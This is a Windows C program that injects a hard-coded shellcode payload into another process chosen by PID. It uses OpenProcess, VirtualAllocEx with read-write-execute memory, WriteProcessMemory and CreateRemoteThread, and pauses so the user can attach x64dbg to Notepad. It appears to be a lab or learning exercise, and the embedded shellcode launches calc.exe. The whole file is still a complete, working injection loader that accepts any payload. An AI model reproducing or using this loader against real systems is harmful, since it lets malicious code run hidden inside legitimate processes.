#include <stdio.h>
#include <windows.h>

int main(void) {
    DWORD targetPid = 0;

    printf("[*] Enter Process ID: ");
    if (scanf("%lu", &targetPid) != 1) {
        printf("[-] Invalid PID.\n");
        return 1;
    }

    // Static OpenProcess
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        targetPid
    );

    if (hProcess == NULL) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Target PID     : %lu\n", targetPid);
    printf("[+] Process Handle : 0x%p\n", hProcess);

    unsigned char shellcode[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Static VirtualAllocEx
    LPVOID allocatedAddress = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    if (allocatedAddress == NULL) {
        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Allocation successful!\n");
    printf("[+] Base Address  : 0x%p\n", allocatedAddress);
    printf("[+] Region Size   : %zu bytes\n", shellcodeSize);

    // Static WriteProcessMemory
    SIZE_T bytesWritten = 0;
    BOOL writeResult = WriteProcessMemory(
        hProcess,
        allocatedAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (!writeResult) {
        printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] WriteProcessMemory successful! Bytes Written : %zu\n", bytesWritten);

    // === DEBUG PAUSE ===
    printf("\n======================================================================\n");
    printf("[!] PAUSED FOR DEBUGGING:\n");
    printf("    1. Open x64dbg -> File -> Attach -> Select PID %lu (Notepad)\n", targetPid);
    printf("    2. Go to Address 0x%p in x64dbg (Memory Map or Ctrl+G)\n", allocatedAddress);
    printf("    3. Set Breakpoint (F2) on 0x%p and press F9 (Run) in x64dbg\n", allocatedAddress);
    printf("======================================================================\n");
    printf("[*] Press ENTER in this console to trigger CreateRemoteThread...\n");
    getchar(); getchar(); 

    // Static CreateRemoteThread
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)allocatedAddress,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] CreateRemoteThread successful! Thread Handle : 0x%p\n", hThread);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    printf("[+] Process handle closed successfully.\n");

    printf("\n[*] Press ENTER to exit program...");
    getchar();

    return 0;
}
